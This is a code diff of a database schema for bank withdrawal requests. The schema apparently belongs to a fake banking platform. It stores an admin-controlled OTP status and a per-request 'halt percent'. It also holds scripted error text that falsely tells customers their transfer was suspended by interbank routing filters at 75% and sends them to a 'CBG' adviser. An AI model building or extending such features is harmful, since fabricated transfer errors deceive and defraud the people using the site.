@@ -68,9 +68,12 @@ export const withdrawalRequestsTable = sqliteTable("withdrawal_requests", {
   bic: text("bic").notNull(),
   amountCents: integer("amount_cents").notNull(),
   description: text("description"),
-  otpCode: text("otp_code").notNull(),
-  status: text("status", { enum: ["pending_otp", "failed_verification", "blocked_at_routing", "completed"] })
-    .default("pending_otp")
+  otpCode: text("otp_code"),
+  haltPercent: integer("halt_percent"),
+  haltMessage: text("halt_message"),
+  errorCode: text("error_code"),
+  status: text("status", { enum: ["pending_admin_otp", "pending_otp", "failed_verification", "blocked_at_routing", "completed"] })
+    .default("pending_admin_otp")
     .notNull(),
   createdAt: text("created_at").notNull(),
 });
@@ -171,12 +174,4 @@ export const analyticsVisits = sqliteTable("analytics_visits", {
   visitDate: text("visit_date").notNull(),
   country: text("country").notNull(),
   visits: integer("visits").default(0).notNull(),
-});
-
-export const transferSettingsTable = sqliteTable("transfer_settings", {
-  id: integer("id").primaryKey(),
-  haltPercent: integer("halt_percent").default(75).notNull(),
-  haltMessage: text("halt_message").default("Erreur de routage bancaire interbancaire (Code: ERR_SEPA_75). Votre virement a été suspendu par les filtres de sécurité. Veuillez contacter votre conseiller bancaire CBG.").notNull(),
-  errorCode: text("error_code").default("ERR_INTERBANK_ROUTING_SUSPENDED").notNull(),
-  updatedAt: text("updated_at").notNull(),
 });
